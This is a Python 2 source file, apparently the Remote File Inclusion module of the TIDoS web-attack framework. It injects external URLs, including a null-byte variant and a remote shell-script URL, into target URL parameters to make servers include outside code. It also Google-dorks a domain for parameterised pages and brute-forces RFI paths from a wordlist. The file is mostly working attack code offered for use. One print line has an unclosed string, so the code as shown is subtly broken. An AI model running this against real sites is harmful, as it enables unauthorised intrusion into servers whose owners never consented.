#!/usr/bin/env python2
# coding: utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author : @_tID
#This module requires TIDoS Framework
#https://github.com/the-Infected-Drake/TIDoS-Framework 

import os
import sys
import requests
import time
import google
from google import search
import urllib2
from random import randint
from time import sleep
from colors import *

global web

goog = []
payloads = []
payload_url = 'https://raw.githubusercontent.com/the-Infected-Drake/TIDoS-Framework/master/runon.sh'
payload_1 = '#!/bin/sh'
payload_2 = 'cd /opt/tidos'
payload_3 = 'python /opt/tidos/tidos.py'

def clear_cookie():
	fo = open(".google-cookie", "w")
	fo.close()

def cust0x00(web):

	web0 = raw_input(GR+' [#] Enter the point scope parameter :> ')

	if str(web0).startswith('/'):
		print GR+' [!] Your input has a "/" in the beginning,..'	
		fof = raw_input(O+' [#] Do you mean root directory? (y/n) :> ')
		if ((fof == 'y') or (fof == 'Y')):
			pass
		elif ((fof == 'n') or (fof == 'N')):
			web0 = web0.replace('/','')
			pass
	test(web0, web)
	print G+' [+] Done!'
	time.sleep(0.6)
	i = raw_input(O+' [#] Proceed to Brute Module? (y/n) :> ')
	if i == 'y' or i == 'Y':
		print G+' [+] Moving on...'
		brute0x00(web)
	elif i == 'n' or i == 'N':
		print G+' [+] RFi completed!'
		time.sleep(0.5) 

def test(web0, web):

	if (('=' in str(web0)) and ('?' in str(web0))):
		if 'http' in str(web0):
			web00 = str(web0)
		else:
			web00 = str(web) + str(web0)
		web0x0 = web00.split('=')[0]
		web0x0 = web0x0 + '='
		print B+' [+] URL : '+C+web0x0
		print G+' [+] Url successfully parsed!'
		print GR+' [*] Trying basic fetch...'
		payload = 'http://www.google.com'
		web000 = web0x0 + payload
		time.sleep(0.5)
		print C+' [+] Payload : http://www.google.com'
		print GR+' [*] Fetching '+C+web000
		om = u' '.join(requests.get(web000).text).encode('utf-8').strip()
		pm = str(om)
		if (("I'm Feeling Lucky" in pm) and ('Google Search' in pm)):
			print G+' [+] Heuristics reveal that '+O+web00+G+' is vulnerable to Remote File Inclusion!'
			time.sleep(0.5)
			print O+' [*] Confirming the vulnerability...'
			time.sleep(0.6)
			print GR+' [*] Trying to load executable scripts...'
			web0x00 = web00 + payload_url
			print C+' [+] Payload : '+B+payload_url
			print GR+' [*] Fetching '+C+web0x00
			oom = requests.get(web0x00).text
			pom = str(oom)
			if ((payload_1 in pom) and (payload_2 in pom) and (payload_3 in pom)):
				print G+' [+] Remote File Inclusion at '+O+web00+G+' is confirmed!'

		elif 'Warning'.lower() in pm.lower():

			if (('=' in str(web0)) and ('?' in str(web0))):
				if 'http' in str(web0):
					web00 = str(web0)
				else:
					web00 = str(web) + str(web0)
				web0x0 = web00.split('=')[0]
				web0x0 = web0x0 + '='
				print O+' [!] Heuristics reveal that the page may not be vulnerable to RFI!'
				print C+' [*] Trying null byte character injection...'
				payload1 = 'https://google.com%00'
				web000 = web0x0 + payload1
				time.sleep(0.5)
				print C+' [+] Payload : http://www.google.com%00'
				print GR+' [*] Fetching '+C+web000
				om = u' '.join(requests.get(web000).text).encode('utf-8').strip()
				pm = str(om)
				if (("I'm Feeling Lucky" in pm) and ('Google Search' in pm)):
					print G+' [+] Heuristics reveal that '+O+web00+G+' is vulnerable to Remote File Inclusion!'
					time.sleep(0.5)
					print O+' [*] Confirming the vulnerability...'
					time.sleep(0.6)
					print GR+' [*] Trying to load executable scripts...'
					web0x00 = web00 + payload_url
					print C+' [+] Payload : '+B+payload_url
					print GR+' [*] Fetching '+C+web0x00
					oom = requests.get(web0x00).text
					pom = str(oom)
					if ((payload_1 in pom) and (payload_2 in pom) and (payload_3 in pom)):
						print G+' [+] Remote File Inclusion at '+O+web00+G+' is confirmed!'

		else:

			if (('=' in str(web0)) and ('?' in str(web0))):
				if 'http' in str(web0):
					web00 = str(web0)
				else:
					web00 = str(web) + str(web0)
				web0x0 = web00.split('=')[0]
				web0x0 = web0x0 + '='
				print O+' [!] Heuristics reveal that the page may not be vulnerable to RFI!'
				print C+' [*] Trying null byte character injection...'
				payload1 = 'https://google.com%00'
				web000 = web0x0 + payload1
				time.sleep(0.5)
				print C+' [+] Payload : http://www.google.com%00'
				print GR+' [*] Fetching '+C+web000
				om = u' '.join(requests.get(web000).text).encode('utf-8').strip()
				pm = str(om)
				if (("I'm Feeling Lucky" in pm) and ('Google Search' in pm)):
					print G+' [+] Heuristics reveal that '+O+web00+G+' is vulnerable to Remote File Inclusion!'
					time.sleep(0.5)
					print O+' [*] Confirming the vulnerability...'
					time.sleep(0.6)
					print GR+' [*] Trying to load executable scripts...'
					web0x00 = web00 + payload_url
					print C+' [+] Payload : '+B+payload_url
					print GR+' [*] Fetching '+C+web0x00
					oom = requests.get(web0x00).text
					pom = str(oom)
					if ((payload_1 in pom) and (payload_2 in pom) and (payload_3 in pom)):
						print G+' [+] Remote File Inclusion at '+O+web00+G+' is confirmed!'
				else:
					
					print R+' [-] This RFI module could not find out any RFI.'
					print O+' [-] This module is extreme basic (more improvements on the way).'
	else:
		print R+' [-] URL without parameter : '+O+web0

def google_it (dork):
	clear_cookie()
	for title in search(dork, stop=30):
		print(G+' [+] Site Found :> '+B+title)
		time.sleep(0.7)
		goog.append(title)
		
def brute0x00(web):

    try:
	print GR+' [*] Importing wordlist...'
	if os.path.exists('files/fuzz-db/rfi_paths.lst') == True:
		print G+' [+] File path found!'
		time.sleep(0.6)
		print O+' [*] Importing wordlist...'
		with open('files/fuzz-db/rfi_paths.lst','r') as wew:
			for w in wew:
				w = w.strip('\n')
				payloads.append(w)
		print GR+' [*] Starting bruteforce...'
		time.sleep(0.7)
		for pay in payloads:
			web0x00 = web + pay
			req = requests.get(web0x00, allow_redirects=False, timeout=7, verify = False)
			c = str(req.status_code)
			if c == '200' or c == '302' or c == '300':
				print G+' [+] Possible RFi at : '+O+web0x00+G+' (200)'
			elif c == '404':
				print B+' [*] Checking dir : '+C+web0x00+R+' (404)
			else:
				print O+' [*] Interesting response : '+GR+web0x00+O+' ('+c+')'
    except Exception as e:
	print R+' [-] Unexpected Exception Encountered!'
	print R+' [-] Exception : '+str(e)

def auto0x00(web):

    try:
	print C+' [-] Warning! You may get a captcha if you are being too frequent...'
	sleep(0.4)
	print O+' [*] Initializing module [1] Google Dorking...'
	google_it (str("site:"+web+' inurl:"?" AND inurl:"="'))
	if goog:
		print G+' [+] Sites found : '+ str(len(goog))
		time.sleep(0.5)
		for go in goog:
			test(go, web)
	else:
		print R+' [-] No sites found via Google Dorks...'
		print G+' [+] Moving on...'
		time.sleep(0.5)
		i = raw_input(O+' [#] Do you want to use custom module (Y/n) :> '+C)
		if i == 'y' or i == 'Y':
			print G+' [+] Loading the custom module...\n'
			time.sleep(0.6)
			cust0x00(web)
			print G+' [+] Custom Module completed!'
			time.sleep(0.7)
			print GR+' [*] Initializing module [3] Bruter...'
			brute0x00(web)
		elif i == 'n':
			print GR+' [*] Okay...'
			time.sleep(0.7)
			print GR+' [*] Initializing module [3] Bruter...'
			brute0x00(web)
		else:
			print R+'\n [-] Sorry fam! You just typed SHIT!\n'
			time.sleep(0.8)

    except urllib2.HTTPError as err:
	if err.code == 503:
	    print R+' [-] Captcha appeared...\n'
	    print O+' [!] Use the custom module and the brute module next...'
	    pass

    except urllib2.URLError:
	print R+' [-] No network connectivity!'

def rfi(web):

	print R+'\n   ==========================================='
	print R+'    R E M O T E   F I L E   I N C L U S I O N'
	print R+'   ===========================================\n'
	print C+'    Choose from the options:'
	print B+'    [1] Custom Targetting'
	print B+'    [2] Automated Scanning\n'

	m = raw_input(O+' [#] Enter your choice :> ')

	if str(web).endswith('/'):
		pass
	else:
		web = web + '/'

	if m == '1':
		cust0x00(web)

	elif m == '2':
		auto0x00(web)

	else:
		print G+' [+] U mad?'
		time.sleep(0.9)
		print ''
		rfi(web)

